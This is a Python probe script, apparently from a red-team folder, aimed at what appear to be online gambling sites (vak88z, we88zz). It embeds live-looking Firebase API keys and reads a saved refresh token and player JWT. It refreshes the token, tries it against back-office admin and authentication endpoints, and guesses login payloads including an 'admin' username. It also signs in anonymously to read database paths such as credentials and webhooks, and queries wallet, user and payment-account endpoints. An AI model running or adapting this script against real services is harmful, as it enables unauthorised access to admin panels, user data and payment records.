#!/usr/bin/env python3
"""probe_fb_refresh.py — Refresh Firebase token with CORRECT vak88z API key.

   Keys discovered:
   - vak88z (m.vak88z2.com player frontend): AIzaSyAELPsIAYigvKgJBAsbl_3WM9_tNOr5UiE
   - we88zz (m.we88c.com new frontend):      AIzaSyAI5j8kaGDUcUDE5ZMk9Um4CneqEx-4q-s

   The refresh_token in fb_refresh_token.txt belongs to vak88z project.
   Previous attempts used we88zz key → PROJECT_NUMBER_MISMATCH.
"""
import json, pathlib, requests, time, base64

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
BGAPI  = f"https://{TID}bgapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"

FB_KEY_VAK88Z  = "AIzaSyAELPsIAYigvKgJBAsbl_3WM9_tNOr5UiE"  # vak88z (player)
FB_KEY_WE88ZZ  = "AIzaSyAI5j8kaGDUcUDE5ZMk9Um4CneqEx-4q-s"  # we88zz (APK/new frontend)
FB_REFRESH     = pathlib.Path("/home/kzp/claude-red/fb_refresh_token.txt").read_text().strip()
JWT_VAK        = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
DOMAIN         = "m.vak88z2.com"

# ── 1. Refresh with correct vak88z key ───────────────────────────────────────
print("=== Refresh Firebase token (vak88z key) ===")
r = requests.post(
    f"https://securetoken.googleapis.com/v1/token?key={FB_KEY_VAK88Z}",
    json={"grant_type": "refresh_token", "refresh_token": FB_REFRESH},
    timeout=15
)
print(f"  HTTP {r.status_code}: {r.text[:400]}")

new_id_token = None
if r.status_code == 200:
    data = r.json()
    new_id_token = data.get("id_token", "")
    new_refresh  = data.get("refresh_token", "")
    pathlib.Path("/home/kzp/claude-red/fb_id_token_new.txt").write_text(new_id_token)
    if new_refresh:
        pathlib.Path("/home/kzp/claude-red/fb_refresh_token_new.txt").write_text(new_refresh)
    print(f"\n  [!!!] NEW ID TOKEN saved → fb_id_token_new.txt")
    print(f"  token[:80]: {new_id_token[:80]}")

    # Decode payload
    parts = new_id_token.split(".")
    if len(parts) >= 2:
        pad = parts[1] + "=" * (-len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(pad))
        print(f"  sub: {payload.get('sub','?')}")
        print(f"  email: {payload.get('email','?')}")
        print(f"  firebase.sign_in_provider: {payload.get('firebase',{}).get('sign_in_provider','?')}")
        exp = payload.get('exp', 0)
        print(f"  expires: {exp} (in {exp - int(time.time())}s)")

# ── 2. Try refreshed token against bgapi ─────────────────────────────────────
if new_id_token:
    token = new_id_token
    print(f"\n=== bgapi with fresh Firebase token ===")

    # GET endpoints (known-working with player JWT)
    for ep, qp in [
        ("/bo/info/admin", f"domain={DOMAIN}"),
        ("/bo/info/provider", f"domain={DOMAIN}"),
        ("/bo/authentication", f"domain={DOMAIN}"),
    ]:
        for scheme in [f"Bearer {token}", f"Firebase {token}"]:
            hdrs = {"Authorization": scheme, "Content-Type": "application/json",
                    "template": "vn", "Origin": f"https://manage.vak88z2.com"}
            r2 = requests.get(f"{BGAPI}{ep}?{qp}", headers=hdrs, timeout=10)
            print(f"  GET {ep} [{scheme[:15]}]: HTTP {r2.status_code}: {r2.text[:150]}")
            if r2.status_code < 400:
                print(f"  [!!!] SUCCESS! Full response:")
                print(r2.text[:800])
            break  # Only try Bearer first

    # POST /bo/authentication with Firebase token as credential
    print(f"\n  POST /bo/authentication with firebase_token payload:")
    for payload in [
        {"firebase_token": token, "domain": DOMAIN},
        {"token": token, "type": "firebase"},
        {"id_token": token, "domain": DOMAIN},
        {"strategy": "firebase", "access_token": token},
        {"strategy": "jwt", "accessToken": token},
        {"username": "admin", "firebase_token": token},
    ]:
        hdrs = {"Content-Type": "application/json",
                "template": "vn", "Origin": "https://manage.vak88z2.com"}
        r2 = requests.post(f"{BGAPI}/bo/authentication?domain={DOMAIN}",
                           headers=hdrs, json=payload, timeout=10)
        keys_str = str(list(payload.keys()))[:50]
        if r2.status_code not in (401, 500):
            print(f"  [!!!] {keys_str}: HTTP {r2.status_code}: {r2.text[:300]}")
        else:
            print(f"  {keys_str}: HTTP {r2.status_code}")

# ── 3. Try we88zz RTDB + anonymous sign-in ───────────────────────────────────
print(f"\n=== we88zz anonymous sign-in (APK Firebase project) ===")
# Sign in anonymously to get a we88zz Firebase token
r = requests.post(
    f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={FB_KEY_WE88ZZ}",
    json={"returnSecureToken": True},
    timeout=12
)
print(f"  signUp(anonymous): HTTP {r.status_code}: {r.text[:300]}")

we88zz_token = None
if r.status_code == 200:
    we88zz_token = r.json().get("idToken", "")
    print(f"  [!!!] we88zz anonymous token: {we88zz_token[:80]}...")

    # Try RTDB with we88zz token
    RTDB = "https://we88zz-default-rtdb.asia-southeast1.firebasedatabase.app"
    for path in ["/.json?shallow=true", "/config.json", "/devices.json?shallow=true",
                 "/webhooks.json?shallow=true", "/credentials.json?shallow=true"]:
        r2 = requests.get(f"{RTDB}{path}&auth={we88zz_token}", timeout=10)
        print(f"  RTDB {path[:40]}: HTTP {r2.status_code}: {r2.text[:200]}")

# ── 4. Also try vak88z RTDB with fresh player token ─────────────────────────
if new_id_token:
    print(f"\n=== vak88z RTDB with fresh player token ===")
    RTDB_VAK = "https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app"
    for path in ["/.json?shallow=true", "/config.json?shallow=true"]:
        r = requests.get(f"{RTDB_VAK}{path}&auth={new_id_token}", timeout=10)
        print(f"  RTDB {path[:40]}: HTTP {r.status_code}: {r.text[:200]}")

# ── 5. Check mgapi with fresh Firebase token ────────────────────────────────
if new_id_token:
    print(f"\n=== mgapi with fresh Firebase token ===")
    for ep in ["/mb/wallet", "/mb/users", "/mb/payment-account"]:
        r = requests.get(f"{MGAPI}{ep}",
                         headers={"Authorization": f"Bearer {new_id_token}",
                                  "template": "vn", "Content-Type": "application/json"},
                         timeout=10)
        print(f"  GET {ep}: HTTP {r.status_code}: {r.text[:150]}")

print("\n=== DONE ===")
